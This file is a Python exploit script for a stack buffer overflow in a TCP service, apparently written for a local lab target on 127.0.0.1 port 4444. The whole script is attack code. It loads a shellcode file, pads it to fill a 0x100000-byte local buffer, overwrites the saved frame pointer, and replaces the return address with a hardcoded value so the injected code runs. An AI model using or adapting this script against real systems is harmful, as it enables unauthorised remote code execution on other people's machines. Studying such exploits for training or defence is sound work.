import socket
import struct
import argparse
import os

host = "127.0.0.1"
port = 4444
return_addr = struct.pack('<I', 0x0131fd70)

def exploit():
    parser = argparse.ArgumentParser(description='Exploit Buffer Overflow')
    parser.add_argument(
        '-s', 
        '--shellcode',
        type=str,
        required=True,
        help='path to shellcode file')
    args = parser.parse_args()

    if not os.path.exists(args.shellcode):
        print(f"Shellcode file {args.shellcode} not found!")

    with open(args.shellcode, mode='rb') as file:
        payload = file.read()

    print("Connect to server IP {host} PORT {port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("Create payload")

    # LPVOID data -> size 0x4
    # LPVOID size -> size 0x4
    # char localBuf -> size 0x100000
    # ebp adrr -> size 0x4
    # return addr -> size 0x4
    buffer_size = 0x100000
    ebp_addr_size = 0x4
    return_addr_size = 0x4
    datasize = 0x4 + 0x4 + buffer_size + ebp_addr_size + return_addr_size

    begin_pattern = b"A" * 8
    if (datasize - len(begin_pattern) - len(payload) - ebp_addr_size - return_addr_size >= 0x0):
        end_pattern = b"B" * (datasize - len(begin_pattern) - len(payload) - ebp_addr_size - return_addr_size)
    else:
        print(f"Payload is too big, required no more then {datasize - len(begin_pattern) - ebp_addr_size - return_addr_size}")
        return
    aligned_payload = begin_pattern + payload + end_pattern

    ebp_addr = b"C" * 4
    shellcode = struct.pack('<I', datasize) + aligned_payload + ebp_addr + return_addr
    s.sendall(shellcode)
    s.close()

    print(f"Payload send!\nSize: {len(shellcode)}\n")

if __name__ == "__main__":
    exploit()
   
